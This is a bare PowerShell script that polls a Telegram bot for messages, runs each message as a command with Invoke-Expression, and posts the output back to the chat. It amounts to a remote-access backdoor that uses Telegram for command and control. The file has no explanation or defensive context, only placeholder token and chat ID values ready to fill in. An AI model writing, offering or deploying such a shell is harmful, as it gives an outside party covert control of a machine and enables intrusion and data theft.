$botToken = "YOUR_TELEGRAM_BOT_TOKEN"
$chatId = "YOUR_CHAT_ID"
$apiUrl = "https://api.telegram.org/bot$botToken"

function Send-Message($message) {
    Invoke-RestMethod -Uri "$apiUrl/sendMessage" -Method Post -Body @{
        chat_id = $chatId
        text = $message
    }
}

function Get-Command() {
    $updates = Invoke-RestMethod -Uri "$apiUrl/getUpdates"
    if ($updates.result) {
        return $updates.result[-1].message.text
    }
    return $null
}

Send-Message "✅ PowerShell Bot Activated. Awaiting commands..."

while ($true) {
    $command = Get-Command
    if ($command -eq "exit") {
        Send-Message "🚫 PowerShell bot shutting down..."
        break
    }
    elseif ($command) {
        $output = Invoke-Expression $command 2>&1
        Send-Message "```\n$output\n```"
    }
    Start-Sleep -Seconds 3  # Polling interval
}
